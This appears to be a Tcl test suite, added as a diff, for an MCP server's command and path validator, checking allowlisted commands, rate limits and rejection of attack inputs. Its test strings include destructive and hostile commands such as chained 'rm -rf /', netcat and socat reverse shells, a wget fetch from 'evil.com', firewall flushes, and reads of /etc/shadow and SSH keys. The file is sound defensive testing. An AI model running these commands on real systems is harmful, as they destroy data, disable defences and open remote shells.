@@ -1,0 +1,649 @@
+#!/usr/bin/env tclsh
+# test_security.test - Tests for mcp::security module
+#
+# CRITICAL: All these tests MUST pass before deployment.
+# Each test verifies that an attack vector is blocked.
+
+package require tcltest
+namespace import ::tcltest::*
+
+# Source dependencies
+set script_dir [file dirname [info script]]
+source [file join $script_dir "../../lib/util.tcl"]
+source [file join $script_dir "../../lib/log.tcl"]
+source [file join $script_dir "../../lib/security.tcl"]
+
+# Suppress log output in tests
+::mcp::log::init ERROR [open /dev/null w]
+
+#===========================================================================
+# ALLOWED COMMANDS (POSITIVE TESTS)
+#===========================================================================
+
+test cmd-allow-1.0 {ls is allowed} -body {
+    ::mcp::security::validate_command "ls -la"
+} -result 1
+
+test cmd-allow-1.1 {cat is allowed} -body {
+    ::mcp::security::validate_command "cat filename.txt"
+} -result 1
+
+test cmd-allow-1.2 {hostname is allowed} -body {
+    ::mcp::security::validate_command "hostname"
+} -result 1
+
+test cmd-allow-1.3 {ps aux is allowed} -body {
+    ::mcp::security::validate_command "ps aux"
+} -result 1
+
+test cmd-allow-1.4 {df -h is allowed} -body {
+    ::mcp::security::validate_command "df -h"
+} -result 1
+
+test cmd-allow-1.5 {whoami is allowed} -body {
+    ::mcp::security::validate_command "whoami"
+} -result 1
+
+test cmd-allow-1.6 {id is allowed} -body {
+    ::mcp::security::validate_command "id"
+} -result 1
+
+test cmd-allow-1.7 {uptime is allowed} -body {
+    ::mcp::security::validate_command "uptime"
+} -result 1
+
+test cmd-allow-1.8 {date is allowed} -body {
+    ::mcp::security::validate_command "date"
+} -result 1
+
+test cmd-allow-1.9 {pwd is allowed} -body {
+    ::mcp::security::validate_command "pwd"
+} -result 1
+
+test cmd-allow-1.10 {grep is allowed} -body {
+    ::mcp::security::validate_command "grep pattern"
+} -result 1
+
+test cmd-allow-1.11 {head is allowed} -body {
+    ::mcp::security::validate_command "head -n 10"
+} -result 1
+
+test cmd-allow-1.12 {tail is allowed} -body {
+    ::mcp::security::validate_command "tail -f"
+} -result 1
+
+test cmd-allow-1.13 {wc is allowed} -body {
+    ::mcp::security::validate_command "wc -l"
+} -result 1
+
+#===========================================================================
+# BASIC BLOCKED COMMANDS
+#===========================================================================
+
+test cmd-block-2.0 {rm is blocked} -body {
+    ::mcp::security::validate_command "rm file.txt"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-block-2.1 {rm -rf is blocked} -body {
+    ::mcp::security::validate_command "rm -rf /"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-block-2.2 {chmod is blocked} -body {
+    ::mcp::security::validate_command "chmod 777 file"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-block-2.3 {chown is blocked} -body {
+    ::mcp::security::validate_command "chown root file"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-block-2.4 {mkdir is blocked} -body {
+    ::mcp::security::validate_command "mkdir newdir"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-block-2.5 {mv is blocked} -body {
+    ::mcp::security::validate_command "mv file1 file2"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-block-2.6 {cp is blocked} -body {
+    ::mcp::security::validate_command "cp file1 file2"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-block-2.7 {ln is blocked} -body {
+    ::mcp::security::validate_command "ln -s target link"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# SHELL METACHARACTER ATTACKS
+#===========================================================================
+
+test cmd-meta-3.0 {pipe is blocked} -body {
+    ::mcp::security::validate_command "ls | cat"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-meta-3.1 {semicolon is blocked} -body {
+    ::mcp::security::validate_command "ls; rm -rf /"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-meta-3.2 {double ampersand is blocked} -body {
+    ::mcp::security::validate_command "ls && rm -rf /"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-meta-3.3 {double pipe is blocked} -body {
+    ::mcp::security::validate_command "false || rm -rf /"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-meta-3.4 {backtick is blocked} -body {
+    ::mcp::security::validate_command "echo `id`"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-meta-3.5 {dollar-paren is blocked} -body {
+    ::mcp::security::validate_command {echo $(id)}
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-meta-3.6 {redirect out is blocked} -body {
+    ::mcp::security::validate_command "echo x > file"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-meta-3.7 {redirect in is blocked} -body {
+    ::mcp::security::validate_command "cat < file"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-meta-3.8 {append redirect is blocked} -body {
+    ::mcp::security::validate_command "echo x >> file"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# PATH-BASED EXECUTION BYPASSES
+#===========================================================================
+
+test cmd-path-4.0 {full path to command blocked} -body {
+    ::mcp::security::validate_command "/bin/rm -rf /"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-path-4.1 {relative path blocked} -body {
+    ::mcp::security::validate_command "./script.sh"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-path-4.2 {usr-bin path blocked} -body {
+    ::mcp::security::validate_command "/usr/bin/python -c 'import os'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-path-4.3 {backslash path blocked} -body {
+    ::mcp::security::validate_command "..\\..\\windows\\system32\\cmd.exe"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# DANGEROUS COMMAND EXECUTION (find, awk, sed, xargs)
+#===========================================================================
+
+test cmd-exec-5.0 {find is blocked (can -exec)} -body {
+    ::mcp::security::validate_command "find /tmp -name '*.txt'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-exec-5.1 {find -exec is blocked} -body {
+    ::mcp::security::validate_command "find /tmp -exec rm {} \\;"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-exec-5.2 {awk is blocked (has system())} -body {
+    ::mcp::security::validate_command "awk '{print}' file"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-exec-5.3 {awk system() blocked} -body {
+    ::mcp::security::validate_command {awk 'BEGIN{system("id")}'}
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-exec-5.4 {gawk is blocked} -body {
+    ::mcp::security::validate_command "gawk '{print}' file"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-exec-5.5 {sed is blocked (can execute)} -body {
+    ::mcp::security::validate_command "sed 's/a/b/' file"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-exec-5.6 {xargs is blocked} -body {
+    ::mcp::security::validate_command "xargs rm"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-exec-5.7 {env is blocked (PATH manipulation)} -body {
+    ::mcp::security::validate_command "env PATH=/tmp ls"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# INTERPRETER EXECUTION
+#===========================================================================
+
+test cmd-interp-6.0 {python blocked} -body {
+    ::mcp::security::validate_command "python -c 'print(1)'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-interp-6.1 {python3 blocked} -body {
+    ::mcp::security::validate_command "python3 -c 'print(1)'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-interp-6.2 {perl blocked} -body {
+    ::mcp::security::validate_command "perl -e 'print 1'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-interp-6.3 {ruby blocked} -body {
+    ::mcp::security::validate_command "ruby -e 'puts 1'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-interp-6.4 {php blocked} -body {
+    ::mcp::security::validate_command "php -r 'echo 1;'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-interp-6.5 {sh blocked} -body {
+    ::mcp::security::validate_command "sh -c 'id'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-interp-6.6 {bash blocked} -body {
+    ::mcp::security::validate_command "bash -c 'id'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-interp-6.7 {zsh blocked} -body {
+    ::mcp::security::validate_command "zsh -c 'id'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-interp-6.8 {node blocked} -body {
+    ::mcp::security::validate_command "node -e 'console.log(1)'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-interp-6.9 {lua blocked} -body {
+    ::mcp::security::validate_command "lua -e 'print(1)'"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-interp-6.10 {tclsh blocked} -body {
+    ::mcp::security::validate_command "tclsh script.tcl"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-interp-6.11 {expect blocked} -body {
+    ::mcp::security::validate_command "expect script.exp"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# NETWORK TOOLS
+#===========================================================================
+
+test cmd-net-7.0 {nc blocked} -body {
+    ::mcp::security::validate_command "nc -l 4444"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-net-7.1 {netcat blocked} -body {
+    ::mcp::security::validate_command "netcat -e /bin/sh 10.0.0.1 4444"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-net-7.2 {ncat blocked} -body {
+    ::mcp::security::validate_command "ncat -l 4444"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-net-7.3 {socat blocked} -body {
+    ::mcp::security::validate_command "socat TCP-LISTEN:4444 EXEC:/bin/sh"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-net-7.4 {curl blocked} -body {
+    ::mcp::security::validate_command "curl http://evil.com"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-net-7.5 {wget blocked} -body {
+    ::mcp::security::validate_command "wget http://evil.com/shell.sh"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-net-7.6 {ssh blocked} -body {
+    ::mcp::security::validate_command "ssh user@host"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-net-7.7 {scp blocked} -body {
+    ::mcp::security::validate_command "scp file user@host:path"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-net-7.8 {sftp blocked} -body {
+    ::mcp::security::validate_command "sftp user@host"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-net-7.9 {rsync blocked} -body {
+    ::mcp::security::validate_command "rsync -avz file user@host:path"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-net-7.10 {telnet blocked} -body {
+    ::mcp::security::validate_command "telnet host 23"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-net-7.11 {ftp blocked} -body {
+    ::mcp::security::validate_command "ftp host"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# PRIVILEGE ESCALATION
+#===========================================================================
+
+test cmd-priv-8.0 {sudo blocked} -body {
+    ::mcp::security::validate_command "sudo ls"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-priv-8.1 {su blocked} -body {
+    ::mcp::security::validate_command "su - root"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-priv-8.2 {passwd blocked} -body {
+    ::mcp::security::validate_command "passwd"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-priv-8.3 {useradd blocked} -body {
+    ::mcp::security::validate_command "useradd hacker"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-priv-8.4 {userdel blocked} -body {
+    ::mcp::security::validate_command "userdel victim"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-priv-8.5 {visudo blocked} -body {
+    ::mcp::security::validate_command "visudo"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# SYSTEM CONTROL
+#===========================================================================
+
+test cmd-sys-9.0 {systemctl blocked} -body {
+    ::mcp::security::validate_command "systemctl stop sshd"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-sys-9.1 {service blocked} -body {
+    ::mcp::security::validate_command "service sshd restart"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-sys-9.2 {shutdown blocked} -body {
+    ::mcp::security::validate_command "shutdown -h now"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-sys-9.3 {reboot blocked} -body {
+    ::mcp::security::validate_command "reboot"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-sys-9.4 {poweroff blocked} -body {
+    ::mcp::security::validate_command "poweroff"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-sys-9.5 {halt blocked} -body {
+    ::mcp::security::validate_command "halt"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-sys-9.6 {init blocked} -body {
+    ::mcp::security::validate_command "init 0"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# PROCESS CONTROL
+#===========================================================================
+
+test cmd-proc-10.0 {kill blocked} -body {
+    ::mcp::security::validate_command "kill -9 1234"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-proc-10.1 {pkill blocked} -body {
+    ::mcp::security::validate_command "pkill sshd"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-proc-10.2 {killall blocked} -body {
+    ::mcp::security::validate_command "killall httpd"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# FIREWALL
+#===========================================================================
+
+test cmd-fw-11.0 {iptables blocked} -body {
+    ::mcp::security::validate_command "iptables -F"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-fw-11.1 {ufw blocked} -body {
+    ::mcp::security::validate_command "ufw disable"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-fw-11.2 {firewall-cmd blocked} -body {
+    ::mcp::security::validate_command "firewall-cmd --panic-on"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-fw-11.3 {nft blocked} -body {
+    ::mcp::security::validate_command "nft flush ruleset"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# SCHEDULED TASKS
+#===========================================================================
+
+test cmd-sched-12.0 {crontab blocked} -body {
+    ::mcp::security::validate_command "crontab -e"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-sched-12.1 {at blocked} -body {
+    ::mcp::security::validate_command "at now"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-sched-12.2 {batch blocked} -body {
+    ::mcp::security::validate_command "batch"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# ENCODING ATTACKS
+#===========================================================================
+
+test cmd-enc-13.0 {null byte blocked} -body {
+    ::mcp::security::validate_command "ls\x00-la"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-enc-13.1 {control char blocked} -body {
+    ::mcp::security::validate_command "ls\x01"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-enc-13.2 {bell char blocked} -body {
+    ::mcp::security::validate_command "ls\x07"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-enc-13.3 {escape char blocked} -body {
+    ::mcp::security::validate_command "ls\x1b"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-enc-13.4 {delete char blocked} -body {
+    ::mcp::security::validate_command "ls\x7f"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# LENGTH ATTACKS
+#===========================================================================
+
+test cmd-len-14.0 {very long command blocked} -body {
+    set long_cmd "ls [string repeat "a" 2000]"
+    ::mcp::security::validate_command $long_cmd
+} -returnCodes error -match glob -result "*SECURITY*length*"
+
+#===========================================================================
+# EMPTY/WHITESPACE
+#===========================================================================
+
+test cmd-empty-15.0 {empty command rejected} -body {
+    ::mcp::security::validate_command ""
+} -returnCodes error -match glob -result "*Empty command*"
+
+test cmd-empty-15.1 {whitespace-only rejected} -body {
+    ::mcp::security::validate_command "   "
+} -returnCodes error -match glob -result "*Empty command*"
+
+test cmd-empty-15.2 {tabs-only rejected} -body {
+    ::mcp::security::validate_command "\t\t"
+} -returnCodes error -match glob -result "*Empty command*"
+
+#===========================================================================
+# ARBITRARY COMMANDS
+#===========================================================================
+
+test cmd-arb-16.0 {arbitrary command rejected} -body {
+    ::mcp::security::validate_command "randomcommand"
+} -returnCodes error -match glob -result "*not in allowlist*"
+
+test cmd-arb-16.1 {dd rejected} -body {
+    ::mcp::security::validate_command "dd if=/dev/zero"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test cmd-arb-16.2 {mkfs rejected} -body {
+    ::mcp::security::validate_command "mkfs.ext4 /dev/sda1"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# PATH VALIDATION TESTS
+#===========================================================================
+
+test path-allow-20.0 {/etc/hostname allowed} -body {
+    ::mcp::security::validate_path "/etc/hostname"
+} -result "/etc/hostname"
+
+test path-allow-20.1 {/var/log/messages allowed} -body {
+    ::mcp::security::validate_path "/var/log/messages"
+} -match glob -result "/var/log/messages"
+
+test path-allow-20.2 {/tmp/file allowed} -body {
+    ::mcp::security::validate_path "/tmp/myfile.txt"
+} -match glob -result "/tmp/myfile.txt"
+
+test path-allow-20.3 {/home/user/file allowed} -body {
+    ::mcp::security::validate_path "/home/user/file.txt"
+} -match glob -result "/home/user/file.txt"
+
+test path-allow-20.4 {/etc allowed} -body {
+    ::mcp::security::validate_path "/etc"
+} -result "/etc"
+
+#===========================================================================
+# SENSITIVE FILE ACCESS
+#===========================================================================
+
+test path-sens-21.0 {/etc/shadow blocked} -body {
+    ::mcp::security::validate_path "/etc/shadow"
+} -returnCodes error -match glob -result "*SECURITY*forbidden*"
+
+test path-sens-21.1 {/etc/passwd- blocked} -body {
+    ::mcp::security::validate_path "/etc/passwd-"
+} -returnCodes error -match glob -result "*SECURITY*forbidden*"
+
+test path-sens-21.2 {/etc/gshadow blocked} -body {
+    ::mcp::security::validate_path "/etc/gshadow"
+} -returnCodes error -match glob -result "*SECURITY*forbidden*"
+
+test path-sens-21.3 {sudoers blocked} -body {
+    ::mcp::security::validate_path "/etc/sudoers"
+} -returnCodes error -match glob -result "*SECURITY*forbidden*"
+
+test path-sens-21.4 {ssh private key blocked} -body {
+    ::mcp::security::validate_path "/home/user/.ssh/id_rsa"
+} -returnCodes error -match glob -result "*SECURITY*forbidden*"
+
+#===========================================================================
+# PATH TRAVERSAL
+#===========================================================================
+
+test path-trav-22.0 {dot-dot traversal normalized} -body {
+    set result [::mcp::security::validate_path "/tmp/../etc/hostname"]
+    # Should normalize to /etc/hostname which is allowed
+    expr {$result eq "/etc/hostname"}
+} -result 1
+
+test path-trav-22.1 {dot-dot to shadow blocked} -body {
+    ::mcp::security::validate_path "/tmp/../etc/shadow"
+} -returnCodes error -match glob -result "*SECURITY*forbidden*"
+
+test path-trav-22.2 {multiple dot-dot blocked} -body {
+    ::mcp::security::validate_path "/tmp/../../root/.bashrc"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+#===========================================================================
+# PATH INJECTION
+#===========================================================================
+
+test path-inj-23.0 {null byte blocked} -body {
+    ::mcp::security::validate_path "/etc/hostname\x00.txt"
+} -returnCodes error -match glob -result "*null byte*"
+
+test path-inj-23.1 {control char blocked} -body {
+    ::mcp::security::validate_path "/etc/hostname\x07"
+} -returnCodes error -match glob -result "*control character*"
+
+test path-inj-23.2 {newline blocked} -body {
+    ::mcp::security::validate_path "/tmp/file\n/etc/shadow"
+} -returnCodes error -match glob -result "*newline*"
+
+test path-inj-23.3 {carriage return blocked} -body {
+    ::mcp::security::validate_path "/tmp/file\r/etc/shadow"
+} -returnCodes error -match glob -result "*newline*"
+
+#===========================================================================
+# DISALLOWED DIRECTORIES
+#===========================================================================
+
+test path-dir-24.0 {/root blocked} -body {
+    ::mcp::security::validate_path "/root/.bashrc"
+} -returnCodes error -match glob -result "*SECURITY*"
+
+test path-dir-24.1 {/bin blocked} -body {
+    ::mcp::security::validate_path "/bin/bash"
+} -returnCodes error -match glob -result "*not in allowed*"
+
+test path-dir-24.2 {/usr/bin blocked} -body {
+    ::mcp::security::validate_path "/usr/bin/python"
+} -returnCodes error -match glob -result "*not in allowed*"
+
+test path-dir-24.3 {/var/spool blocked} -body {
+    ::mcp::security::validate_path "/var/spool/cron/root"
+} -returnCodes error -match glob -result "*not in allowed*"
+
+test path-dir-24.4 {/boot blocked} -body {
+    ::mcp::security::validate_path "/boot/vmlinuz"
+} -returnCodes error -match glob -result "*not in allowed*"
+
+#===========================================================================
+# PATH LENGTH ATTACKS
+#===========================================================================
+
+test path-len-25.0 {very long path blocked} -body {
+    set long_path "/tmp/[string repeat "a" 600]"
+    ::mcp::security::validate_path $long_path
+} -returnCodes error -match glob -result "*SECURITY*length*"
+
+#===========================================================================
+# RATE LIMITING TESTS
+#===========================================================================
+
+test rate-26.0 {first request allowed} -setup {
+    ::mcp::security::reset_rate_limits
+} -body {
+    ::mcp::security::check_rate_limit "test-client-1"
+} -result 1
+
+test rate-26.1 {requests within limit allowed} -setup {
+    ::mcp::security::reset_rate_limits
+} -body {
+    for {set i 0} {$i < 99} {incr i} {
+        ::mcp::security::check_rate_limit "test-client-2"
+    }
+    expr 1
+} -result 1
+
+test rate-26.2 {request at limit allowed} -setup {
+    ::mcp::security::reset_rate_limits
+} -body {
+    for {set i 0} {$i < 100} {incr i} {
+        ::mcp::security::check_rate_limit "test-client-3"
+    }
+    expr 1
+} -result 1
+
+test rate-26.3 {request over limit blocked} -setup {
+    ::mcp::security::reset_rate_limits
+} -body {
+    for {set i 0} {$i < 100} {incr i} {
+        ::mcp::security::check_rate_limit "test-client-4"
+    }
+    # This should fail
+    ::mcp::security::check_rate_limit "test-client-4"
+} -returnCodes error -match glob -result "*Rate limit exceeded*"
+
+cleanupTests
